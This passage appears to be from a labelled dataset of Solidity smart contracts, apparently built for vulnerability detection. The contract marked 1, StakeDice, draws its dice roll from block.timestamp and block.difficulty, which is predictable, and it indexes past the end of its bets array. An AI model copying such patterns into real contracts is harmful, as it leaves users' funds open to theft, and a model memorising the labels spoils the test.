debtor, address receiver) public view returns (DirectDebit);  function setupDirectDebit(address receiver, DirectDebitInfo info) public returns (bool);  function terminateDirectDebit(address receiver) public returns (bool);  function withdrawDirectDebit(address debtor) public returns (bool);  function withdrawDirectDebit(address[] debtors, bool strict) public returns (bool);}
0<CODESPLIT>contract ERC20Like is SecureERC20, FsTKToken {  using AddressExtension for address;  using Math for uint256;  modifier liquid {    require(isLiquid);     _;  }  modifier canUseDirectDebit {    require(isDirectDebitEnable);     _;  }  modifier canDelegate {    require(isDelegateEnable);     _;  }  modifier notThis(address _address) {    require(_address != address(this));    _;  }  bool public erc20ApproveChecking;  bool public isLiquid = true;  bool public isDelegateEnable;  bool public isDirectDebitEnable;  string public metadata;  mapping(address => Account) internal accounts;  constructor(string _metadata) public {    metadata = _metadata;  }  function balanceOf(address owner) public view returns (uint256) {    return accounts[owner].balance;  }  function allowance(address owner, address spender) public view returns (uint256) {    return accounts[owner].instruments[spender].allowance;  }  function transfer(address to, uint256 value) public liquid returns (bool) {    Account storage senderAccount = accounts[msg.sender];    senderAccount.balance = senderAccount.balance.sub(value);    accounts[to].balance += value;    emit Transfer(msg.sender, to, value);    return true;  }  function transferFrom(address from, address to, uint256 value) public liquid returns (bool) {    Account storage fromAccount = accounts[from];    Instrument storage senderInstrument = fromAccount.instruments[msg.sender];    fromAccount.balance = fromAccount.balance.sub(value);    senderInstrument.allowance = senderInstrument.allowance.sub(value);    accounts[to].balance += value;    emit Transfer(from, to, value);    return true;  }  function approve(address spender, uint256 value) public returns (bool) {    Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];    if (erc20ApproveChecking) {      require((value == 0) || (spenderInstrument.allowance == 0));    }    emit Approval(      msg.sender,      spender,      spenderInstrument.allowance = value    );    return true;  }  function setERC20ApproveChecking(bool approveChecking) public {    emit SetERC20ApproveChecking(erc20ApproveChecking = approveChecking);  }  function approve(address spender, uint256 expectedValue, uint256 newValue) public returns (bool) {    Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];    require(spenderInstrument.allowance == expectedValue);    emit Approval(      msg.sender,      spender,      spenderInstrument.allowance = newValue    );    return true;  }  function increaseAllowance(address spender, uint256 value) public returns (bool) {    Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];    emit Approval(      msg.sender,      spender,      spenderInstrument.allowance = spenderInstrument.allowance.add(value)    );    return true;  }  function decreaseAllowance(address spender, uint256 value, bool strict) public returns (bool) {    Instrument storage spenderInstrument = accounts[msg.sender].instruments[spender];    uint256 currentValue = spenderInstrument.allowance;    uint256 newValue;    if (strict) {      newValue = currentValue.sub(value);    } else if (value < currentValue) {      newValue = currentValue - value;    }    emit Approval(      msg.sender,      spender,      spenderInstrument.allowance = newValue    );    return true;  }  function setMetadata0(string _metadata) internal {    emit SetMetadata(metadata = _metadata);  }  function setLiquid0(bool liquidity) internal {    emit SetLiquid(isLiquid = liquidity);  }  function setDelegate(bool delegate) public {    emit SetDelegate(isDelegateEnable = delegate);  }  function setDirectDebit(bool directDebit) public {    emit SetDirectDebit(isDirectDebitEnable = directDebit);  }  function spendableAllowance(address owner, address spender) public view returns (uint256) {    Account storage ownerAccount = accounts[owner];    return Math.min(      ownerAccount.instruments[spender].allowance,      ownerAccount.balance    );  }  function transfer(uint256[] data) public liquid returns (bool) {    Account storage senderAccount = accounts[msg.sender];    uint256 totalValue;    for (uint256 i = 0; i < data.length; i++) {      address receiver = address(data[i] >> 96);      uint256 value = data[i] & 0xffffffffffffffffffffffff;      totalValue = totalValue.add(value);      accounts[receiver].balance += value;      emit Transfer(msg.sender, receiver, value);    }    senderAccount.balance = senderAccount.balance.sub(totalValue);    return true;  }  function transferAndCall(    address to,    uint256 value,    bytes data  )    public    payable    liquid    notThis(to)    returns (bool)  {    require(      transfer(to, value) &&      data.length >= 68    );    assembly {        mstore(add(data, 36), value)        mstore(add(data, 68), caller)    }    require(to.call.value(msg.value)(data));    return true;  }  function nonceOf(address owner) public view returns (uint256) {    return accounts[owner].nonce;  }  function increaseNonce() public returns (bool) {    emit IncreaseNonce(msg.sender, accounts[msg.sender].nonce += 1);  }  function delegateTransferAndCall(    uint256 nonce,    uint256 fee,    address to,    uint256 value,    bytes data,    address delegator,    uint8 v,    bytes32 r,    bytes32 s  )    public    liquid    canDelegate    notThis(to)    returns (bool)  {    address signer = ecrecover(      keccak256(abi.encodePacked(nonce, fee, to, value, data, delegator)),      v,      r,      s    );    Account storage signerAccount = accounts[signer];    require(      nonce == signerAccount.nonce &&      (delegator == address(0) || delegator == msg.sender)    );    emit IncreaseNonce(signer, signerAccount.nonce += 1);    signerAccount.balance = signerAccount.balance.sub(value.add(fee));    accounts[to].balance += value;    emit Transfer(signer, to, value);    accounts[msg.sender].balance += fee;    emit Transfer(signer, msg.sender, fee);    if (!to.isAccount()) {      require(data.length >= 68);      assembly {        mstore(add(data, 36), value)        mstore(add(data, 68), signer)      }      require(to.call(data));    }    return true;  }  function directDebit(address debtor, address receiver) public view returns (DirectDebit) {    return accounts[debtor].instruments[receiver].directDebit;  }  function setupDirectDebit(    address receiver,    DirectDebitInfo info  )    public    returns (bool)  {    accounts[msg.sender].instruments[receiver].directDebit = DirectDebit({      info: info,      epoch: 0    });    emit SetupDirectDebit(msg.sender, receiver, info);    return true;  }  function terminateDirectDebit(address receiver) public returns (bool) {    delete accounts[msg.sender].instruments[receiver].directDebit;    emit TerminateDirectDebit(msg.sender, receiver);    return true;  }  function withdrawDirectDebit(address debtor) public liquid canUseDirectDebit returns (bool) {    Account storage debtorAccount = accounts[debtor];    DirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;    uint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);    uint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);    require(amount > 0);    debtorAccount.balance = debtorAccount.balance.sub(amount);    accounts[msg.sender].balance += amount;    debit.epoch = epoch;    emit Transfer(debtor, msg.sender, amount);    return true;  }  function withdrawDirectDebit(address[] debtors, bool strict) public liquid canUseDirectDebit returns (bool result) {    Account storage receiverAccount = accounts[msg.sender];    result = true;    uint256 total;    for (uint256 i = 0; i < debtors.length; i++) {      address debtor = debtors[i];      Account storage debtorAccount = accounts[debtor];      DirectDebit storage debit = debtorAccount.instruments[msg.sender].directDebit;      uint256 epoch = (block.timestamp.sub(debit.info.startTime) / debit.info.interval).add(1);      uint256 amount = epoch.sub(debit.epoch).mul(debit.info.amount);      require(amount > 0);      uint256 debtorBalance = debtorAccount.balance;      if (amount > debtorBalance) {        if (strict) {          revert();        }        result = false;        emit WithdrawDirectDebitFailure(debtor, msg.sender);      } else {        debtorAccount.balance = debtorBalance - amount;        total += amount;        debit.epoch = epoch;        emit Transfer(debtor, msg.sender, amount);      }    }    receiverAccount.balance += total;  }}
0<CODESPLIT>contract ServiceVoucher is Authorizable, ERC20Like {  uint256 public totalSupply;  string public name;  string public symbol;  uint8 public constant decimals = 0;  bool public constant isConsumable = true;  constructor(    FsTKAuthority _fstkAuthority,    string _name,    string _symbol,    string _metadata  )    Authorizable(_fstkAuthority)    ERC20Like(_metadata)    public  {    name = _name;    symbol = _symbol;  }  function mint(address to, uint256 value) public onlyFsTKAuthorized returns (bool) {    totalSupply = totalSupply.add(value);    accounts[to].balance += value;    emit Transfer(address(0), to, value);    return true;  }  function consume(address from, uint256 value) public onlyFsTKAuthorized returns (bool) {    Account storage fromAccount = accounts[from];    fromAccount.balance = fromAccount.balance.sub(value);    totalSupply -= value;    emit Consume(from, value, bytes32(0));    emit Transfer(from, address(0), value);  }  function setMetadata(string infoUrl) public onlyFsTKAuthorized {    setMetadata0(infoUrl);  }  function setLiquid(bool liquidity) public onlyFsTKAuthorized {    setLiquid0(liquidity);  }  function setERC20ApproveChecking(bool approveChecking) public onlyFsTKAuthorized {    super.setERC20ApproveChecking(approveChecking);  }  function setDelegate(bool delegate) public onlyFsTKAuthorized {    super.setDelegate(delegate);  }  function setDirectDebit(bool directDebit) public onlyFsTKAuthorized {    super.setDirectDebit(directDebit);  }  function transferToken(ERC20 erc20, address to, uint256 value) public onlyFsTKAuthorized {    erc20.transfer(to, value);  }}
0<CODESPLIT>contract FsTKAllocation {  function initialize(uint256 _vestedAmount) public;}
0<CODESPLIT>contract FunderSmartToken is Authorizable, ERC20Like {  string public constant name = "Funder Smart Token";  string public constant symbol = "FST";  uint256 public constant totalSupply = 330000000 ether;  uint8 public constant decimals = 18;  constructor(    FsTKAuthority _fstkAuthority,    string _metadata,    address coldWallet,    FsTKAllocation allocation  )    Authorizable(_fstkAuthority)    ERC20Like(_metadata)    public  {    uint256 vestedAmount = totalSupply / 12;    accounts[allocation].balance = vestedAmount;    emit Transfer(address(0), allocation, vestedAmount);    allocation.initialize(vestedAmount);    uint256 releaseAmount = totalSupply - vestedAmount;    accounts[coldWallet].balance = releaseAmount;    emit Transfer(address(0), coldWallet, releaseAmount);  }  function setMetadata(string infoUrl) public onlyFsTKAuthorized {    setMetadata0(infoUrl);  }  function setLiquid(bool liquidity) public onlyFsTKAuthorized {    setLiquid0(liquidity);  }  function setERC20ApproveChecking(bool approveChecking) public onlyFsTKAuthorized {    super.setERC20ApproveChecking(approveChecking);  }  function setDelegate(bool delegate) public onlyFsTKAuthorized {    super.setDelegate(delegate);  }  function setDirectDebit(bool directDebit) public onlyFsTKAuthorized {    super.setDirectDebit(directDebit);  }  function transferToken(ERC20 erc20, address to, uint256 value) public onlyFsTKAuthorized {    erc20.transfer(to, value);  }}
0<CODESPLIT>contract FsTKColdWallet {  using Math for uint256;  event ConfirmationNeeded(address indexed initiator, bytes32 indexed operation, address indexed to, uint256 value, bytes data);  event Confirmation(address indexed authority, bytes32 indexed operation);  event Revoke(address indexed authority, bytes32 indexed operation);  event AuthorityChanged(address indexed oldAuthority, address indexed newAuthority);  event AuthorityAdded(address authority);  event AuthorityRemoved(address authority);  event RequirementChanged(uint256 required);  event DayLimitChanged(uint256 dayLimit);  event SpentTodayReset(uint256 spentToday);  event Deposit(address indexed from, uint256 value);  event SingleTransaction(address indexed authority, address indexed to, uint256 value, bytes data, address created);  event MultiTransaction(address indexed authority, bytes32 indexed operation, address indexed to, uint256 value, bytes data, address created);  struct TransactionInfo {    address to;    uint256 value;    bytes data;  }  struct PendingTransactionState {    TransactionInfo info;    uint256 confirmNeeded;    uint256 confirmBitmap;    uint256 index;  }  modifier onlyAuthority {    require(isAuthority(msg.sender));    _;  }  modifier confirmAndRun(bytes32 operation) {    if (confirmAndCheck(operation)) {      _;    }  }  uint256 constant MAX_AUTHORITIES = 250;  uint256 public requiredAuthorities;  uint256 public numAuthorities;  uint256 public dailyLimit;  uint256 public spentToday;  uint256 public lastDay;  address[256] public authorities;  mapping(address => uint256) public authorityIndex;  mapping(bytes32 => PendingTransactionState) public pendingTransaction;  bytes32[] public pendingOperation;  constructor(address[] _authorities, uint256 required, uint256 _daylimit) public {    require(      required > 0 &&      authorities.length >= required    );    numAuthorities = _authorities.length;    for (uint256 i = 0; i < _authorities.length; i += 1) {      authorities[1 + i] = _authorities[i];      authorityIndex[_authorities[i]] = 1 + i;    }    requiredAuthorities = required;    dailyLimit = _daylimit;    lastDay = today();  }  function() external payable {    if (msg.value > 0) {      emit Deposit(msg.sender, msg.value);    }  }  function getAuthority(uint256 index) public view returns (address) {    return authorities[index + 1];  }  function getAuthorityIndex(address authority) public view returns (uint256 index) {    index = authorityIndex[authority];    require(index > 0);  }  function isAuthority(address authority) public view returns (bool) {    return authorityIndex[authority] > 0;  }  function hasConfirmed(bytes32 operation, address _address) public view returns (bool) {    return (pendingTransaction[operation].confirmBitmap & (1 << getAuthorityIndex(_address))) != 0;  }  function changeAuthority(address from, address to) public confirmAndRun(keccak256(msg.data)) {    require(!isAuthority(to));    uint256 index = getAuthorityIndex(from);    authorities[index] = to;    authorityIndex[to] = index;    delete authorityIndex[from];    clearPending();    emit AuthorityChanged(from, to);  }  function addAuthority(address authority) public confirmAndRun(keccak256(msg.data)) {    require(!isAuthority(authority));    if (numAuthorities >= MAX_AUTHORITIES) {      reOrganizeAuthorities();    }    require(numAuthorities < MAX_AUTHORITIES);    numAuthorities += 1;    authorities[numAuthorities] = authority;    authorityIndex[authority] = numAuthorities;    clearPending();    emit AuthorityAdded(authority);  }  function removeAuthority(address authority) public confirmAndRun(keccak256(msg.data)) {    require(numAuthorities > requiredAuthorities);    uint256 index = getAuthorityIndex(authority);    delete authorities[index];    delete authorityIndex[authority];    clearPending();    reOrganizeAuthorities();    emit AuthorityRemoved(authority);  }  function setRequirement(uint256 required) public confirmAndRun(keccak256(msg.data)) {    require(numAuthorities >= requiredAuthorities);    clearPending();    emit RequirementChanged(requiredAuthorities = required);  }  function setDailyLimit(uint256 _dailyLimit) public confirmAndRun(keccak256(msg.data)) {    clearPending();    emit DayLimitChanged(dailyLimit = _dailyLimit);  }  function resetSpentToday() public confirmAndRun(keccak256(msg.data)) {    clearPending();    emit SpentTodayReset(spentToday);    delete spentToday;  }  function propose(    address to,    uint256 value,    bytes data  )    public    onlyAuthority    returns (bytes32 operation)  {    if ((data.length == 0 && checkAndUpdateLimit(value)) || requiredAuthorities == 1) {      emit SingleTransaction(msg.sender, to, value, data, execute0(to, value, data));    } else {      operation = keccak256(abi.encodePacked(msg.data, pendingOperation.length));      PendingTransactionState storage status = pendingTransaction[operation];      if (status.info.to == 0 && status.info.value == 0 && status.info.data.length == 0) {        status.info = TransactionInfo({          to: to,          value: value,          data: data        });      }      if (!confirm(operation)) {        emit ConfirmationNeeded(msg.sender, operation, to, value, data);      }    }  }  function revoke(bytes32 operation) public {    uint256 confirmFlag = 1 << getAuthorityIndex(msg.sender);    PendingTransactionState storage state = pendingTransaction[operation];    if (state.confirmBitmap & confirmFlag > 0) {      state.confirmNeeded += 1;      state.confirmBitmap &= ~confirmFlag;      emit Revoke(msg.sender, operation);    }  }  function confirm(bytes32 operation) public confirmAndRun(operation) returns (bool) {     PendingTransactionState storage status = pendingTransaction[operation];    if (status.info.to != 0 || status.info.value != 0 || status.info.data.length != 0) {      emit MultiTransaction(        msg.sender,        operation,        status.info.to,        status.info.value,        status.info.data,        execute0(status.info.to, status.info.value, status.info.data)      );      delete pendingTransaction[operation].info;      return true;    }  }  function execute0(    address to,    uint256 value,    bytes data  )    private    returns (address created)  {    if (to == 0) {      created = create0(value, data);    } else {      require(to.call.value(value)(data));    }  }  function create0(uint256 value, bytes code) internal returns (address _address) {    assembly {      _address := create(value, add(code, 0x20), mload(code))      if iszero(extcodesize(_address)) {        revert(0, 0)      }    }  }  function confirmAndCheck(bytes32 operation) private returns (bool) {    PendingTransactionState storage pending = pendingTransaction[operation];    if (pending.confirmNeeded == 0) {      pending.confirmNeeded = requiredAuthorities;      delete pending.confirmBitmap;      pending.index = pendingOperation.length;      pendingOperation.push(operation);    }    uint256 confirmFlag = 1 << getAuthorityIndex(msg.sender);    if (pending.confirmBitmap & confirmFlag == 0) {      emit Confirmation(msg.sender, operation);      if (pending.confirmNeeded <= 1) {        delete pendingOperation[pending.index];        delete pending.confirmNeeded;        delete pending.confirmBitmap;        delete pending.index;        return true;      } else {        pending.confirmNeeded -= 1;        pending.confirmBitmap |= confirmFlag;      }    }  }  function checkAndUpdateLimit(uint256 value) private returns (bool) {    if (today() > lastDay) {      spentToday = 0;      lastDay = today();    }    uint256 _spentToday = spentToday.add(value);    if (_spentToday <= dailyLimit) {      spentToday = _spentToday;      return true;    }    return false;  }  function today() private view returns (uint256) {    return block.timestamp / 1 days;  }  function reOrganizeAuthorities() private {    uint256 free = 1;    while (free < numAuthorities) {      while (free < numAuthorities && authorities[free] != 0) {        free += 1;      }      while (numAuthorities > 1 && authorities[numAuthorities] == 0) {        numAuthorities -= 1;      }      if (free < numAuthorities && authorities[numAuthorities] != 0 && authorities[free] == 0) {        authorities[free] = authorities[numAuthorities];        authorityIndex[authorities[free]] = free;        delete authorities[numAuthorities];      }    }  }  function clearPending() private {    for (uint256 i = 0; i < pendingOperation.length; i += 1) {      delete pendingTransaction[pendingOperation[i]];    }    delete pendingOperation;  }}
0<CODESPLIT>contract StakeToken{    function transfer(address _to, uint256 _value) public returns (bool success);    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);    function balanceOf(address _owner) public view returns (uint256 balance);}
0<CODESPLIT>contract StakeDiceGame{         function () payable external    {        revert();    }                      StakeDice public stakeDice;                            uint256 public winningChance;                            function multiplierOnWin() public view returns (uint256)    {        uint256 beforeHouseEdge = 10000;        uint256 afterHouseEdge = beforeHouseEdge - stakeDice.houseEdge();        return afterHouseEdge * 10000 / winningChance;    }        function maximumBet() public view returns (uint256)    {        uint256 availableTokens = stakeDice.stakeTokenContract().balanceOf(address(stakeDice));        return availableTokens * 10000 / multiplierOnWin() / 5;    }                                    constructor(StakeDice _stakeDice, uint256 _winningChance) public    {                 require(_winningChance > 0);        require(_winningChance < 10000);        require(_stakeDice != address(0x0));        require(msg.sender == address(_stakeDice));                stakeDice = _stakeDice;        winningChance = _winningChance;    }             function setWinningChance(uint256 _newWinningChance) external    {        require(msg.sender == stakeDice.owner());        require(_newWinningChance > 0);        require(_newWinningChance < 10000);        winningChance = _newWinningChance;    }                  function withdrawStakeTokens(uint256 _amount, address _to) external    {        require(msg.sender == stakeDice.owner());        require(_to != address(0x0));        stakeDice.stakeTokenContract().transfer(_to, _amount);    }}
1<CODESPLIT>contract StakeDice{                  StakeToken public stakeTokenContract;    mapping(address => bool) public addressIsStakeDiceGameContract;    StakeDiceGame[] public allGames;    uint256 public houseEdge;    uint256 public minimumBet;                      address[] public allPlayers;    mapping(address => uint256) public playersToTotalBets;    mapping(address => uint256[]) public playersToBetIndices;    function playerAmountOfBets(address _player) external view returns (uint256)    {        return playersToBetIndices[_player].length;    }        function totalUniquePlayers() external view returns (uint256)    {        return allPlayers.length;    }                           event BetPlaced(address indexed gambler, uint256 betIndex);    event BetWon(address indexed gambler, uint256 betIndex);    event BetLost(address indexed gambler, uint256 betIndex);    event BetCanceled(address indexed gambler, uint256 betIndex);        enum BetStatus    {        NON_EXISTANT,        IN_PROGRESS,        WON,        LOST,        CANCELED    }        struct Bet    {        address gambler;        uint256 winningChance;        uint256 betAmount;        uint256 potentialRevenue;        uint256 roll;        BetStatus status;    }        Bet[] public bets;    uint public betsLength = 0;    mapping(bytes32 => uint256) public oraclizeQueryIdsToBetIndices;        function betPlaced(address gameContract, uint256 _amount) external    {                 require(addressIsStakeDiceGameContract[gameContract] == true);                          require(_amount >= minimumBet);        require(_amount <= StakeDiceGame(gameContract).maximumBet());                         stakeTokenContract.transferFrom(msg.sender, this, _amount);                                 uint256 potentialRevenue = StakeDiceGame(gameContract).multiplierOnWin() * _amount / 10000;                         emit BetPlaced(msg.sender, bets.length);        playersToBetIndices[msg.sender].push(bets.length);        bets.push(Bet({gambler: msg.sender, winningChance: StakeDiceGame(gameContract).winningChance(), betAmount: _amount, potentialRevenue: potentialRevenue, roll: 0, status: BetStatus.IN_PROGRESS}));        betsLength +=1;                 if (playersToTotalBets[msg.sender] == 0)        {            allPlayers.push(msg.sender);        }        playersToTotalBets[msg.sender] += _amount;                 uint256 betIndex = betsLength;        Bet storage bet = bets[betIndex];        require(bet.status == BetStatus.IN_PROGRESS);                 uint randomNumber = uint8(uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty)))%100);                        bet.roll = randomNumber;                         if (randomNumber < bet.winningChance/100)        {                                      if (stakeTokenContract.balanceOf(this) < bet.potentialRevenue)            {                _cancelBet(betIndex);            }                                     else            {                                 bet.status = BetStatus.WON;                                             stakeTokenContract.transfer(bet.gambler, bet.potentialRevenue);                                                 emit BetWon(bet.gambler, betIndex);            }        }        else        {                         bet.status = BetStatus.LOST;                                                  stakeTokenContract.transfer(bet.gambler, 1);                                       emit BetLost(bet.gambler, betIndex);        }    }        function _cancelBet(uint256 _betIndex) private    {                 require(bets[_betIndex].status == BetStatus.IN_PROGRESS);                         bets[_betIndex].status = BetStatus.CANCELED;                         stakeTokenContract.transfer(bets[_betIndex].gambler, bets[_betIndex].betAmount);                         emit BetCanceled(bets[_betIndex].gambler, _betIndex);                         playersToTotalBets[bets[_betIndex].gambler] -= bets[_betIndex].betAmount;    }        function amountOfGames() external view returns (uint256)    {        return allGames.length;    }        function amountOfBets() external view returns (uint256)    {        return bets.length-1;    }                      address public owner;             constructor(StakeToken _stakeTokenContract, uint256 _houseEdge, uint256 _minimumBet) public    {                          bets.length = 1;                         owner = msg.sender;                         require(_houseEdge < 10000);        require(_stakeTokenContract != address(0x0));                         stakeTokenContract = _stakeTokenContract;        houseEdge = _houseEdge;        minimumBet = _minimumBet;    }             function createDefaultGames() public    {        require(allGames.length == 0);                addNewStakeDiceGame(500);          addNewStakeDiceGame(1000);          addNewStakeDiceGame(1500);          addNewStakeDiceGame(2000);          addNewStakeDiceGame(2500);          addNewStakeDiceGame(3000);          addNewStakeDiceGame(3500);          addNewStakeDiceGame(4000);          addNewStakeDiceGame(4500);          addNewStakeDiceGame(5000);          addNewStakeDiceGame(5500);          addNewStakeDiceGame(6000);          addNewStakeDiceGame(6500);          addNewStakeDiceGame(7000);          addNewStakeDiceGame(7500);          addNewStakeDiceGame(8000);          addNewStakeDiceGame(8500);          addNewStakeDiceGame(9000);          addNewStakeDiceGame(9500);      }                       function cancelBet(uint256 _betIndex) public    {        require(msg.sender == owner);                _cancelBet(_betIndex);    }             function addNewStakeDiceGame(uint256 _winningChance) public    {        require(msg.sender == owner);                         StakeDiceGame newGame = new StakeDiceGame(this, _winningChance);                         addressIsStakeDiceGameContract[newGame] = true;        allGames.push(newGame);    }             function setHouseEdge(uint256 _newHouseEdge) external    {        require(msg.sender == owner);        require(_newHouseEdge < 10000);        houseEdge = _newHouseEdge;    }                       function setMinimumBet(uint256 _newMinimumBet) external    {        require(msg.sender == owner);        minimumBet = _newMinimumBet;    }                  function depositEther() payable external    {        require(msg.sender == owner);    }    function withdrawEther(uint256 _amount) payable external    {        require(msg.sender == owner);        owner.transfer(_amount);    }             function transferOwnership(address _newOwner) external     {        require(msg.sender == owner);        require(_newOwner != 0x0);        owner = _newOwner;    }             function withdrawStakeTokens(uint256 _amount) external    {        require(msg.sender == owner);        stakeTokenContract.transfer(owner, _amount);    }             function () payable external    {        revert();    }    }
0<CODESPLIT>contract IAugur {    function createChildUniverse(bytes32 _parentPayoutDistributionHash, uint256[] _parentPayoutNumerators, bool _parentInvalid) public returns (IUniverse);    function isKnownUniverse(IUniverse _universe) public view returns (bool);    function trustedTransfer(ERC20 _token, address _from, address _to, uint256 _amount) public returns (bool);    function logMarketCreated(bytes32 _topic, string _description, string _extraInfo, IUniverse _universe, address _market, address _marketCreator, bytes32[] _outcomes, int256 _minPrice, int256 _maxPrice, IMarket.MarketType _marketType) public returns (bool);    function logMarketCreated(bytes32 _topic, string _description, string _extraInfo, IUniverse _universe, address _market, address _marketCreator, int256 _minPrice, int256 _maxPrice, IMarket.MarketType _marketType) public returns (bool);    function logInitialReportSubmitted(IUniverse _universe, address _reporter, address _market, uint256 _amountStaked, bool _isDesignatedReporter, uint256[] _payoutNumerators, bool _invalid) public returns (bool);    function disputeCrowdsourcerCreated(IUniverse _universe, address _market, address _disputeCrowdsourcer, uint256[] _payoutNumerators, uint256 _size, bool _invalid) public returns (bool);    function logDisputeCrowdsourcerContribution(IUniverse _universe, address _reporter, address _market, address _disputeCrowdsourcer, uint256 _amountStaked) public returns (bool);    function logDisputeCrowdsourcerCompleted(IUniverse _universe, address _market, address _disputeCrowdsourcer) public returns (bool);    function logInitialReporterRedeemed(IUniverse _universe, address _reporter, address _market, uint256 _amountRedeemed, uint256 _repReceived, uint256 _reportingFeesReceived, uint256[] _payoutNumerators) public returns (bool);    function logDisputeCrowdsourcerRedeemed(IUniverse _universe, address _reporter, address _market, uint256 _amountRedeemed, uint256 _repReceived, uint256 _reportingFeesReceived, uint256[] _payoutNumerators) public returns (bool);    function logFeeWindowRedeemed(IUniverse _universe, address _reporter, uint256 _amountRedeemed, uint256 _reportingFeesReceived) public returns (bool);    function logMarketFinalized(IUniverse _universe) public returns (bool);    function logMarketMigrated(IMarket _market, IUniverse _originalUniverse) public returns (bool);    function logReportingParticipantDisavowed(IUniverse _universe, IMarket _market) public returns (bool);    function logMarketParticipantsDisavowed(IUniverse _universe) public returns (bool);    function logOrderCanceled(IUniverse _universe, address _shareToken, address _sender, bytes32 _orderId, Order.Types _orderType, uint256 _tokenRefund, uint256 _sharesRefund) public returns (bool);    function logOrderCreated(Order.Types _orderType, uint256 _amount, uint256 _price, address _creator, uint256 _moneyEscrowed, uint256 _sharesEscrowed, bytes32 _tradeGroupId, bytes32 _orderId, IUniverse _universe, address _shareToken) public returns (bool);    function logOrderFilled(IUniverse _universe, address _shareToken, address _filler, bytes32 _orderId, uint256 _numCreatorShares, uint256 _numCreatorTokens, uint256 _numFillerShares, uint256 _numFillerTokens, uint256 _marketCreatorFees, uint256 _reporterFees, uint256 _amountFilled, bytes32 _tradeGroupId) public returns (bool);    function logCompleteSetsPurchased(IUniverse _universe, IMarket _market, address _account, uint256 _numCompleteSets) public returns (bool);    function logCompleteSetsSold(IUniverse _universe, IMarket _market, address _account, uint256 _numCompleteSets) public returns (bool);    function logTradingProceedsClaimed(IUniverse _universe, address _shareToken, address _sender, address _market, uint256 _numShares, uint256 _numPayoutTokens, uint256 _finalTokenBalance) public returns (bool);    function logUniverseForked() public returns (bool);    function logFeeWindowTransferred(IUniverse _universe, address _from, address _to, uint256 _value) public returns (bool);    function logReputationTokensTransferred(IUniverse _universe, address _from, address _to, uint256 _value) public returns (bool);    function logDisputeCrowdsourcerTokensTransferred(IUniverse _universe, address _from, address _to, uint256 _value) public returns (bool);    function logShareTokensTransferred(IUniverse _universe, address _from, address _to, uint256 _value) public returns (bool);    function logReputationTokenBurned(IUniverse _universe, address _target, uint256 _amount) public returns (bool);    function logReputationTokenMinted(IUniverse _universe, address _target, uint256 _amount) public returns (bool);    function logShareTokenBurned(IUniverse _universe, address _target, uint256 _amount) public returns (bool);    function logShareTokenMinted(IUniverse _universe, address _target, uint256 _amount) public returns (bool);    function logFeeWindowBurned(IUniverse _universe, address _target, uint256 _amount) public returns (bool);    function logFeeWindowMinted(IUniverse _universe, address _target, uint256 _amount) public returns (bool);    function logDisputeCrowdsourcerTokensBurned(IUniverse _universe, address _target, uint256 _amount) public returns (bool);    function logDisputeCrowdsourcerTokensMinted(IUniverse _universe, address _target, uint256 _amount) public returns (bool);    function logFeeWindowCreated(IFeeWindow _feeWindow, uint256 _id) public returns (bool);    function logFeeTokenTransferred(IUniverse _universe, address _from, address _to, uint256 _value) public returns (bool);    function logFeeTokenBurned(IUniverse _universe, address _target, uint256 _amount) public returns (bool);    function logFeeTokenMinted(IUniverse _universe, address _target, uint256 _amount) public returns (bool);    function logTimestampSet(uint256 _newTimestamp) public returns (bool);    function logInitialReporterTransferred(IUniverse _universe, IMarket _market, address _from, address _to) public returns (bool);    function logMarketTransferred(IUniverse _universe, address _from, address _to) public returns (bool);    function logMarketMailboxTransferred(IUniverse _universe, IMarket _market, address _from, address _to) public returns (bool);    function logEscapeHatchChanged(bool _isOn) public returns (bool);}
0<CODESPLIT>contract IControlled {    function getController() public view returns (IController);    function setController(IController _controller) public returns(bool);}
0<CODESPLIT>contract Controlled is IControlled {    IController internal controller;    modifier onlyWhitelistedCallers {        require(controller.assertIsWhitelisted(msg.sender));        _;    }    modifier onlyCaller(bytes32 _key) {        require(msg.sender == controller.lookup(_key));        _;    }    modifier onlyControllerCaller {        require(IController(msg.sender) == controller);        _;    }    modifier onlyInGoodTimes {        require(controller.stopInEmergency());        _;    }    modifier onlyInBadTimes {        require(controller.onlyInEmergency());        _;    }    function Controlled() public {        controller = IController(msg.sender);    }    function getController() public view returns(IController) {        return controller;    }    function setController(IController _controller) public onlyControllerCaller returns(bool) {        controller = _controller;        return true;    }}
0<CODESPLIT>contract IController {    function assertIsWhitelisted(address _target) public view returns(bool);    function lookup(bytes32 _key) public view returns(address);    function stopInEmergency() public view returns(bool);    function onlyInEmergency() public view returns(bool);    function getAugur() public view returns (IAugur);    function getTimestamp() public view returns (uint256);}
0<CODESPLIT>contract IOwnable {    function getOwner() public view returns (address);    function transferOwnership(address newOwner) public returns (bool);}
0<CODESPLIT>contract ITyped {    function getTypeName() public view returns (bytes32);}
0<CODESPLIT>contract ITime is Controlled, ITyped {    function getTimestamp() external view returns (uint256);}
0<CODESPLIT>contract Time is ITime {    function getTimestamp() external view returns (uint256) {        return block.timestamp;    }    function getTypeName() public view returns (bytes32) {        return "Time";    }}
0<CODESPLIT>contract Initializable {    bool private initialized = false;    modifier afterInitialized {        require(initialized);        _;    }    modifier beforeInitialized {        require(!initialized);        _;    }    function endInitialization() internal beforeInitialized returns (bool) {        initialized = true;        return true;    }    function getInitialized() public view returns (bool) {        return initialized;    }}library SafeMathUint256 {    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        uint256 c = a * b;        require(a == 0 || c / a == b);        return c;    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {                 uint256 c = a / b;                 return c;    }    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        require(b <= a);        return a - b;    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        uint256 c = a + b;        require(c >= a);        return c;    }    function min(uint256 a, uint256 b) internal pure returns (uint256) {        if (a <= b) {            return a;        } else {            return b;        }    }    function max(uint256 a, uint256 b) internal pure returns (uint256) {        if (a >= b) {            return a;        } else {            return b;        }    }    function getUint256Min() internal pure returns (uint256) {        return 0;    }    function getUint256Max() internal pure returns (uint256) {        return 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;    }    function isMultipleOf(uint256 a, uint256 b) internal pure returns (bool) {        return a % 